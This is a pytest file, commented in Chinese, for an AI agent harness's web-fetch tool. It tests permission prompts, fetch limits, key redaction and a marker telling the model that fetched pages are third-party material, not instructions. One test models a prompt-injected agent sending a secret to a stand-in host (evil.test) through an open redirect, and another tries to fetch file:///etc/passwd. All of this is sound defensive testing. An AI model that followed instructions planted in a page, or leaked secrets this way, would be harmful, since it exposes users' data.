"""读网页这个工具（harness/tools/fetch.py）和它周围的几样：问不问你、发给哪家模型、"智狐能做的事"、设置里的开关。

要守住的：
  - 交给模型的结果第一句就说明这是第三方的资料（不是指示），后面是网址、标题、正文；太长的截掉并说一声；
  - 问不问你：这段对话里第一次读一个网站之前问，卡片上是完整的网址（? 后面的一个字都不少）；读过的网站不再问；
    "全部自动允许"不问（留下 auto_allowed 的记录）；"只读的命令""改文件"两档照样问；定时任务按它自己的那一档；
    换一段对话从头再问；
  - 每条消息最多读几次（和 Claude 的联网搜索共用 HARNESS_MAX_SEARCHES），到了上限不弹卡片、直接告诉模型；下一条消息重新数；
  - 发给谁：GPT、Gemini、DeepSeek 拿到它；Claude 开着联网搜索时只有服务器上的那一个（不重复），HARNESS_WEB=0 时拿到这一个；
  - 读到的网页里像密钥的东西，交给模型之前遮住（和别的工具的结果一样，见 redact.py）；
  - 倒回一轮时它算"只是看"（rewind.py）；设置里能关，关了以后的新对话没有它，"智狐能做的事"说它关着、去哪儿打开。

网站是本地的假网站（tests/fetch_rig.py），模型是本地的假服务器，不连任何真的网站、不花钱。
"""

from __future__ import annotations

import json
from types import SimpleNamespace
from urllib.parse import parse_qs, quote, urlsplit

import openai
import pytest
from conftest import RecordingUI
from fake_api import reply, text
from fake_openai import FakeOpenAI, call, chat
from fetch_rig import FakeSite, fetcher, page, redirect

from harness import capabilities, rewind
from harness.agents import tools as agent_tools
from harness.app import build_app
from harness.fetch import guard
from harness.fetch.session import FetchSession
from harness.permissions import Permissions, review_fetch
from harness.tools import fetch as fetch_tool
from harness.tools.base import ToolError
from harness.tools.fetch import FetchFacts, make_fetch_tool, used_in

# 长得像一个 Anthropic 密钥的一串（假的）：网页里有它，交给模型之前要遮住
FAKE_KEY = "sk-ant-api03-" + "Abc123XyZ" * 8


@pytest.fixture
def site():
    made = FakeSite().start()
    yield made
    made.stop()


def make_tool(site_fetcher, limit: int = 0, enabled: bool = True):
    session = FetchSession()
    turn = [1]
    tool = make_fetch_tool(lambda: session, lambda: enabled, lambda: site_fetcher, lambda: turn[0], limit)
    return SimpleNamespace(tool=tool, session=session, turn=turn)


@pytest.fixture
def start_gpt(make_config):
    """GPT（OpenAI 格式，没有联网搜索），读网页连本地的假网站。"""
    servers: list[FakeOpenAI] = []

    def start(*replies, approve: bool = True, hosts=("site.test",), **config_overrides):
        api = FakeOpenAI(list(replies)).start()
        servers.append(api)
        config = make_config(default_provider="openai", default_model="gpt-5", **config_overrides)
        ui = RecordingUI(approve)
        client = openai.OpenAI(api_key="test-key", base_url=api.base_url, max_retries=0)
        app = build_app(config, ui, client_factory=lambda provider: client)
        app.fetcher = fetcher(*hosts)
        return SimpleNamespace(agent=app.agent, app=app, api=api, ui=ui, config=config)

    yield start
    for api in servers:
        api.stop()


def fetch_call(url: str, id: str = "c1") -> dict:
    return call(id, "web_fetch", json.dumps({"url": url}))


def tool_message(request: dict) -> str:
    """一次请求里最后一条工具结果的文字。"""
    return [message for message in request["messages"] if message["role"] == "tool"][-1]["content"]


# ---- 结果 ------------------------------------------------------------------------------


def test_result_says_it_is_third_party_material(site):
    site.routes["/post"] = page("<title>一篇文章</title><meta name='description' content='讲读网页'><main><h1>正文标题</h1><p>第一段。</p></main>")
    made = make_tool(fetcher("site.test"))
    result = made.tool.run({"url": site.url("/post")})
    lines = result.split("\n")
    assert lines[0] == fetch_tool.THIRD_PARTY
    assert lines[1] == f"网址：{site.url('/post')}"
    assert "标题：一篇文章" in result and "简介：讲读网页" in result
    assert "# 正文标题\n第一段。" in result


def test_redirect_is_mentioned(site):
    site.routes["/old"] = redirect("/new")
    site.routes["/new"] = page("<p>新地方</p>")
    result = make_tool(fetcher("site.test")).tool.run({"url": site.url("/old")})
    assert f"网址：{site.url('/new')}（从 {site.url('/old')} 跳转过来）" in result


def test_plain_text_and_json(site):
    site.routes["/a.json"] = page('{"天气": "晴"}', content_type="application/json")
    result = make_tool(fetcher("site.test")).tool.run({"url": site.url("/a.json")})
    assert '{"天气": "晴"}' in result and "类型：application/json" in result


def test_long_text_is_cut_with_a_note(site, monkeypatch):
    monkeypatch.setattr(fetch_tool, "FETCH_MAX_CHARS", 100)
    site.routes["/long"] = page("字" * 250, content_type="text/plain; charset=utf-8")
    result = make_tool(fetcher("site.test")).tool.run({"url": site.url("/long")})
    assert "字" * 100 in result and "字" * 101 not in result
    assert "只交给你前 100 个字，后面还有 150 个字没给" in result


def test_empty_page_says_why(site):
    site.routes["/app"] = page("<div id='root'></div><script>render()</script>")
    assert fetch_tool.EMPTY in make_tool(fetcher("site.test")).tool.run({"url": site.url("/app")})


@pytest.mark.parametrize(
    ("route", "words"),
    [
        (page("<h1>Not found</h1>", status=404), "HTTP 404"),
        (page(b"%PDF-1.7", content_type="application/pdf"), "PDF"),
        (page(b"\x89PNG\r\n", content_type="image/png"), "图片"),
    ],
    ids=["404", "pdf", "image"],
)
def test_what_it_cannot_read(site, route, words):
    site.routes["/x"] = route
    with pytest.raises(ToolError, match=words):
        make_tool(fetcher("site.test")).tool.run({"url": site.url("/x")})


def test_refused_before_anything_is_sent(site):
    made = make_tool(fetcher("site.test"))
    for url in ("file:///etc/passwd", "ftp://site.test/", "http://user:pw@site.test/", "http://0x7f.1/"):
        assert made.tool.check({"url": url}), url  # 不弹卡片，直接告诉模型
        with pytest.raises(ToolError):
            made.tool.run({"url": url})
    assert site.requests == []


# Python 的 urlsplit 自己就会拒绝的写法：方括号里不是 IP 地址的（3.11.4 起会抛 ValueError）
UNPARSABLE = "http://[1:2:3:4:5:6:7:8:9]/"


def test_a_url_python_cannot_split_is_refused_not_raised(site):
    # 以前 check、look 里整理网址那一步直接抛 ValueError：模型给一个这样的网址，整轮就断了（还被说成"用户中断了操作"）
    made = make_tool(fetcher("site.test"))
    assert made.tool.check({"url": UNPARSABLE})
    assert made.tool.look({"url": UNPARSABLE}).refusal
    with pytest.raises(ToolError):
        made.tool.run({"url": UNPARSABLE})
    site.routes["/go"] = redirect(UNPARSABLE)  # 网站跳到这样的网址：也是说清楚的拒绝，不是"工具内部出错"
    with pytest.raises(ToolError, match="跳转到了"):
        made.tool.run({"url": site.url("/go")})


def test_a_url_python_cannot_split_does_not_end_the_turn(start_gpt):
    s = start_gpt(chat(calls=[fetch_call(UNPARSABLE)]), chat("这个网址读不了。"))
    s.agent.run_turn("读一下")
    assert s.ui.confirmations == []
    assert "没有读" in tool_message(s.api.requests[1])  # 说清楚不读（哪个 Python 版本上拒绝的说法略有不同）


def test_switched_off(site):
    made = make_tool(fetcher("site.test"), enabled=False)
    assert made.tool.check({"url": site.url("/")}) == fetch_tool.OFF
    with pytest.raises(ToolError, match="关着"):
        made.tool.run({"url": site.url("/")})


def test_no_scheme_means_https():
    made = make_tool(fetcher("site.test"))
    assert made.tool.look({"url": "site.test/docs"}).url == "https://site.test/docs"


# ---- 问不问你 ------------------------------------------------------------------------


@pytest.fixture
def permissions(tmp_path):
    from harness.tools.files import FileEditor

    workspace = tmp_path / "work"
    workspace.mkdir()
    return Permissions(FileEditor(workspace, tmp_path / "backups"))


def test_first_time_on_a_site_asks_with_the_full_url(site, permissions):
    made = make_tool(fetcher("site.test"))
    long_query = "?data=" + "a" * 600 + "&end=1"  # 比卡片上一般的网址长：一个字都不能少
    url = site.url("/search" + long_query)
    question = permissions.review("web_fetch", {"url": url}, made.tool)
    assert question is not None and url in question
    assert "site.test" in question
    assert permissions.allowance("web_fetch", {"url": url}, made.tool) is None  # 每次都问那一档：要问


def test_a_site_read_before_is_not_asked_again(site, permissions):
    site.routes["/a"] = page("<p>a</p>")
    made = make_tool(fetcher("site.test"))
    made.tool.run({"url": site.url("/a")})
    assert permissions.review("web_fetch", {"url": site.url("/other?x=1")}, made.tool) is None
    # 另一个网站照样问
    assert permissions.review("web_fetch", {"url": site.url("/a", host="other.test")}, made.tool) is not None


def test_same_site_redirect_counts_as_read(site):
    # 假网站不分主机名，所以跳到另一条路径上：site.test/ → www.site.test/home
    site.routes["/"] = redirect(site.url("/home", host="www.site.test"))
    site.routes["/home"] = page("<p>x</p>")
    made = make_tool(fetcher("site.test", "www.site.test", "elsewhere.test"))
    made.tool.run({"url": site.url("/")})
    assert made.tool.look({"url": site.url("/other", host="www.site.test")}).new_site is False
    # 跳到别的网站去的不算：那个网站是对方选的，下一次模型自己去那里，照样问你
    site.routes["/away"] = redirect(site.url("/home", host="elsewhere.test"))
    made.tool.run({"url": site.url("/away")})
    assert made.tool.look({"url": site.url("/home", host="elsewhere.test")}).new_site is True


def _open_redirect(handler) -> None:
    """一个"开放跳转"：/go?to=任何网址 就跳过去。很多网站都有（登录以后回到哪儿、外链的中转页）。"""
    target = parse_qs(urlsplit(handler.path).query).get("to", [""])[0]
    handler.send_response(302)
    handler.send_header("Location", target)
    handler.send_header("Content-Length", "0")
    handler.send_header("Connection", "close")
    handler.end_headers()


def test_an_allowed_site_cannot_bounce_the_fetch_to_a_site_you_never_allowed(site, permissions):
    # 你允许过 site.test。被网页带偏的模型之后读 site.test/go?to=http://evil.test/collect?data=秘密：同一个网站，不再问你，
    # 可 site.test 把它原样跳到 evil.test，秘密就到了一个你从没允许过的网站手里（卡片上一次都没出现过它）
    site.routes["/"] = page("<p>首页</p>")
    site.routes["/go"] = _open_redirect
    site.routes["/collect"] = page("<p>收到了</p>")
    site_fetcher = fetcher("site.test", "evil.test")
    made = make_tool(site_fetcher)
    made.tool.run({"url": site.url("/")})  # 第一次读 site.test（假设你点了允许）
    evil = site.url("/collect?data=secret", host="evil.test")
    bounce = site.url("/go?to=" + quote(evil, safe=""))
    assert permissions.review("web_fetch", {"url": bounce}, made.tool) is None  # 同一个网站：不再问
    result = made.tool.run({"url": bounce})
    hosts = [request["headers"]["host"].split(":")[0] for request in site.requests]
    assert "evil.test" not in hosts  # evil.test 一个字节都没收到
    assert "evil.test" not in site_fetcher.resolved  # 连域名都没解析：解析本身就会把名字里的字送到那边的 DNS 服务器
    assert evil in result and "web_fetch" in result  # 告诉模型跳到了哪儿、要读它得自己再调用一次
    assert permissions.review("web_fetch", {"url": evil}, made.tool) is not None  # 那时照常先问你


def test_a_redirect_to_a_site_already_allowed_is_followed(site):
    site.routes["/go"] = _open_redirect
    site.routes["/collect"] = page("<p>收到了</p>")
    made = make_tool(fetcher("site.test", "other.test"))
    made.session.allow(guard.site_of(site.url("/", host="other.test")))  # 这段对话里允许过 other.test
    result = made.tool.run({"url": site.url("/go?to=" + quote(site.url("/collect", host="other.test"), safe=""))})
    assert "收到了" in result


@pytest.mark.parametrize(("mode", "asked"), [("ask", True), ("readonly", True), ("edits", True), ("all", False)])
def test_modes(permissions, mode, asked):
    # 只有"全部自动允许"不问：读网页是往外发，"只读的命令"和"改工作目录里的文件"两档放开的都不是它
    permissions.mode = mode
    tool = make_tool(fetcher("site.test")).tool
    url = "https://site.test/"
    assert permissions.review("web_fetch", {"url": url}, tool) is not None
    assert (permissions.allowance("web_fetch", {"url": url}, tool) is None) is asked


@pytest.mark.parametrize(("approval", "asked"), [("ask", True), ("edits", True), ("all", False)])
def test_scheduled_tasks_use_their_own_level(permissions, approval, asked):
    permissions.mode = "all"  # 对话里放开了，任务里不算数
    unattended = permissions.unattended(approval)
    tool = make_tool(fetcher("site.test")).tool
    assert (unattended.allowance("web_fetch", {"url": "https://site.test/"}, tool) is None) is asked


def test_review_fetch_does_not_ask_for_what_will_not_happen():
    assert review_fetch(FetchFacts(refusal="不读")) is None
    assert review_fetch(FetchFacts(url="https://a.test/", site="https://a.test", new_site=False)) is None


# ---- 每条消息最多几次 --------------------------------------------------------------------


def test_per_message_limit(site):
    site.routes["/"] = page("<p>x</p>")
    made = make_tool(fetcher("site.test"), limit=2)
    for _ in range(2):
        assert made.tool.check({"url": site.url("/")}) is None
        made.tool.run({"url": site.url("/")})
    refusal = made.tool.check({"url": site.url("/")})
    assert refusal and "2 次" in refusal  # 不弹卡片，直接告诉模型
    with pytest.raises(ToolError, match="上限"):
        made.tool.run({"url": site.url("/")})
    made.turn[0] += 1  # 下一条消息：重新数
    assert made.tool.check({"url": site.url("/")}) is None
    assert len(site.requests) == 2


# ---- 一整轮：GPT 调用它，你点允许，结果交回去 ----------------------------------------------


def test_full_loop_with_gpt(start_gpt, site):
    site.routes["/notes"] = page(f"<title>笔记</title><p>今天的笔记。{FAKE_KEY}</p>")
    s = start_gpt(
        chat(calls=[fetch_call(site.url("/notes"))]),
        chat("读完了。"),
        chat(calls=[fetch_call(site.url("/notes?again=1"), id="c2")]),
        chat("又读了一遍。"),
    )
    s.agent.run_turn("读一下这个网页")
    assert len(s.ui.confirmations) == 1 and site.url("/notes") in s.ui.confirmations[0]
    sent = tool_message(s.api.requests[1])
    assert sent.startswith(fetch_tool.THIRD_PARTY) and "今天的笔记。" in sent
    assert FAKE_KEY not in sent and "已遮住" in sent  # 网页里像密钥的东西交给模型之前遮住了
    # 下一条消息再读同一个网站：不再问
    s.agent.run_turn("再读一遍")
    assert len(s.ui.confirmations) == 1
    assert len(site.requests) == 2


def test_refusing_sends_nothing(start_gpt, site):
    site.routes["/"] = page("<p>x</p>")
    s = start_gpt(chat(calls=[fetch_call(site.url("/"))]), chat("好的，不读了。"), approve=False)
    s.agent.run_turn("读一下")
    assert len(s.ui.confirmations) == 1 and site.requests == []


def test_all_mode_does_not_ask_but_leaves_a_record(start_gpt, site):
    site.routes["/"] = page("<p>x</p>")
    s = start_gpt(chat(calls=[fetch_call(site.url("/"))]), chat("好了"))
    s.app.permissions.mode = "all"
    s.agent.run_turn("读一下")
    assert s.ui.confirmations == [] and s.ui.auto_allowed_count == 1
    assert len(site.requests) == 1


def test_a_new_conversation_asks_again(start_gpt, site):
    site.routes["/"] = page("<p>x</p>")
    s = start_gpt(chat(calls=[fetch_call(site.url("/"))]), chat("好了"), chat(calls=[fetch_call(site.url("/"), id="c2")]), chat("好了"))
    s.agent.run_turn("读一下")
    s.app.new_conversation()
    s.agent.run_turn("再读一下")
    assert len(s.ui.confirmations) == 2


def test_gpt_gets_the_tool(start_gpt):
    s = start_gpt(chat("你好"))
    s.agent.run_turn("你好")
    names = [tool["function"]["name"] for tool in s.api.requests[0]["tools"]]
    assert "web_fetch" in names
    spec = next(tool["function"] for tool in s.api.requests[0]["tools"] if tool["function"]["name"] == "web_fetch")
    assert spec["description"] == fetch_tool.DESCRIPTION  # 固定的一段话
    assert spec["parameters"]["required"] == ["url"]


def test_switched_off_in_settings(start_gpt):
    s = start_gpt(chat("你好"))
    s.app.settings.set_web_fetch(False)
    s.app.refresh_tools()
    s.agent.run_turn("你好")
    assert "web_fetch" not in [tool["function"]["name"] for tool in s.api.requests[0]["tools"]]
    web = next(item for item in capabilities.overview(s.app).items if item.id == "web")
    assert web.status == "off" and ("settings", "fetch") in [(action.kind, action.target) for action in web.actions]


def test_used_before_comes_back_even_when_switched_off(start_gpt, site):
    site.routes["/"] = page("<p>x</p>")
    s = start_gpt(chat(calls=[fetch_call(site.url("/"))]), chat("好了"), chat("还在"))
    s.agent.run_turn("读一下")
    s.app.save_conversation([])
    conversation_id = s.app.conversation.id
    s.app.settings.set_web_fetch(False)
    s.app.new_conversation()
    s.app.open_conversation(conversation_id)
    s.agent.run_turn("接着聊")
    # 历史里调用过它：打开以后说明书里照样有它（调用时会回答"关着"）
    assert "web_fetch" in [tool["function"]["name"] for tool in s.api.requests[-1]["tools"]]


def test_used_in_reads_both_formats():
    assert used_in([{"role": "assistant", "tool_calls": [{"function": {"name": "web_fetch", "arguments": "{}"}}]}])
    assert used_in([{"role": "assistant", "content": [{"type": "tool_use", "name": "web_fetch", "input": {}}]}])
    # Anthropic 服务器上的那一个不算
    assert not used_in([{"role": "assistant", "content": [{"type": "server_tool_use", "name": "web_fetch", "input": {}}]}])


# ---- 发给谁：Claude 不重复 -------------------------------------------------------------


def test_claude_with_web_search_gets_only_the_server_one(start):
    s = start(reply(text("你好")))
    s.agent.run_turn("你好")
    tools = s.api.requests[0]["tools"]
    fetches = [tool for tool in tools if tool.get("name") == "web_fetch"]
    assert len(fetches) == 1 and fetches[0]["type"] == "web_fetch_20250910"
    assert ("web_fetch", True) not in s.app.tool_names()  # 本地的那一个不在这段对话的工具里
    web = next(item for item in capabilities.overview(s.app).items if item.id == "web")
    assert web.where == "provider" and web.tools == ["web_search", "web_fetch"]


def test_claude_without_web_search_gets_this_one(start):
    s = start(reply(text("你好")), web=False)
    s.agent.run_turn("你好")
    fetches = [tool for tool in s.api.requests[0]["tools"] if tool.get("name") == "web_fetch"]
    assert len(fetches) == 1 and "input_schema" in fetches[0] and "type" not in fetches[0]
    web = next(item for item in capabilities.overview(s.app).items if item.id == "web")
    assert web.status == "on" and web.where == "local" and "HARNESS_WEB=0" in web.reason


# ---- 智狐能做的事 -----------------------------------------------------------------------


def test_capabilities_for_a_model_without_web_search(start_gpt):
    s = start_gpt()
    web = next(item for item in capabilities.overview(s.app).items if item.id == "web")
    assert web.status == "on" and web.where == "local" and web.tools == ["web_fetch"]
    assert "只有 Claude 能联网搜索" in web.reason
    outcomes = {str(rule.text): rule.outcome for rule in web.approval.rules}
    assert outcomes == {"读这段对话里读过的网站": "free", "读一个新的网站": "ask"}
    s.app.permissions.mode = "all"
    web = next(item for item in capabilities.overview(s.app).items if item.id == "web")
    assert {rule.outcome for rule in web.approval.rules} == {"free"}


def test_a_role_without_web_fetch(start_gpt, tmp_path):
    s = start_gpt()
    folder = s.config.data_dir / "agents"
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "reader.md").write_text("---\nname: reader\ndescription: 只读文件\ntools: [Read]\n---\n只读文件。\n", encoding="utf-8")
    s.app.new_conversation("reader")
    assert "web_fetch" not in [tool.name for tool in s.app.toolbox()[0]]
    web = next(item for item in capabilities.overview(s.app).items if item.id == "web")
    assert web.status == "unavailable" and "reader" in web.reason


# ---- 别的几处登记 ---------------------------------------------------------------------


def test_rewind_counts_it_as_looking():
    assert rewind.changes("web_fetch", {"url": "https://a.test/"}) is False


def test_the_card_line_shows_the_address():
    # 工具卡片、终端上那一行：读的是哪个网址
    from harness.display import describe_call

    assert describe_call("web_fetch", {"url": "https://example.com/a?b=1"}) == "web_fetch https://example.com/a?b=1"


def test_agent_files_can_name_it():
    assert "WebFetch" in agent_tools.builtin_names(web=False, fetch=True)
    assert "WebFetch" not in agent_tools.builtin_names(web=False, fetch=False)
    assert "WebSearch" not in agent_tools.builtin_names(web=False, fetch=True)


def test_unattended_runs_have_it(start_gpt, site):
    site.routes["/"] = page("<p>x</p>")
    s = start_gpt(chat(calls=[fetch_call(site.url("/"))]), chat("好了"))
    ui = RecordingUI(approve=True)
    run = s.app.unattended_agent(ui, approval="ask")
    assert run.agent.tools.get("web_fetch") is not None
    run.agent.run_turn("读一下")
    assert len(ui.confirmations) == 1  # 任务自己的那一档是"每次都问"
    assert len(site.requests) == 1
